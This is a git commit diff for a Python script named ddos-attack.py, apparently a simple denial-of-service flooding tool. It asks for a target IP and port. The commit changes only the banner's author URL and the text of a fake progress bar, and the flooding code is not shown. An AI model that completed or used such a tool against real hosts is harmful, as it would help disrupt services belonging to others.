42899ea344061e22ecbfe0a05d40092723626fc3
guru lashkare <38384331+guru-lashkare@users.noreply.github.com>
2019-12-15 15:51:09 +0530

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -21,7 +21,7 @@ os.system("clear")
 os.system("figlet DDos Attack")
 print
 print "Author   : guru"
-print "github   : https://github.com/whitehat-hacker-rajas/d-ddos2.git"
+print "github   : https://github.com/guru-lashkare/d-ddos2.git"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -30,13 +30,13 @@ os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[====G               ] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[========GU          ] 50%"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[============GUR     ] 75%"
 time.sleep(5)
-print "[====================] 100%"
+print "[================GURU] 100%"
 time.sleep(3)
 sent = 0
 while True:
